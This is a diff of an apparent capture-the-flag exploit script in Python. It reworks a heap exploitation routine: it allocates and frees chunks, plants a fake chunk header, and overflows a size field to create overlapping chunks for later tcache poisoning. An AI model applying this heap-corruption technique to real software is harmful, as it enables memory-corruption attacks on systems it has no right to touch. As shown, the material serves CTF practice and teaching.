@@ -476,23 +476,25 @@ def level8_0(p):
     '''
     read_flag(p) # Do this early to make calculation off heap base easy
 
-    malloc_id(p, '0', str(0x18)) # For overflow into chunk 2
-    # Need next chunk to be big enough to contain a non-tcache chunk + another chunk
-    malloc_id(p, '1', str(0x480)) # Overflow into this, removing the last byte of size
-    malloc_id(p, '2', str(0x410)) # For Consolidation with chunk 1, resulting in overlap of sub-chunk within 1
-    malloc_id(p, '3', str(0x18)) # Guard
-    
-    # Write fake next size into chunk 1 where our tcache chunk will end up
-    # Also need to setup the prev size of the tcache chunk
-    # TODO: Figure out math
-    read_copy(p, '1', b'A'*0x408 + p64(0x51))
+    malloc_id(p, '0', str(0x18))
+    malloc_id(p, '1', str(0x550))
+    malloc_id(p, '2', str(0x500))
+    malloc_id(p, '3', str(0x18))
 
-    # Free chunk 1 to set chunk 2's prev size field
+    # Make fake chunk within victim to meet size field checks
+    read_copy(p, '1', b'a'*0x4f0 + p64(0x500) + p64(0x60))
+
+    # Stick victim in unsorted bin
     free_id(p, '1')
-    # Overflow chunk 0 so that chunk 1 shrinks. Now chunk 2's prevsize won't get updated properly
-    read_copy(p, '0', 'A'*0x18)
-    # Allocate two chunks from chunk 1, one in tcache to use for poisoning
-    malloc_id(p, '4', str(0x420))
+
+    # Overwrite size, preventing proper prev size updating
+    read_copy(p, '0', b'A'*0x18)
+
+    malloc_id(p, '4', str(0x4a8))
+    malloc_id(p, '5', str(0x48))
+
+
+
 
 
 
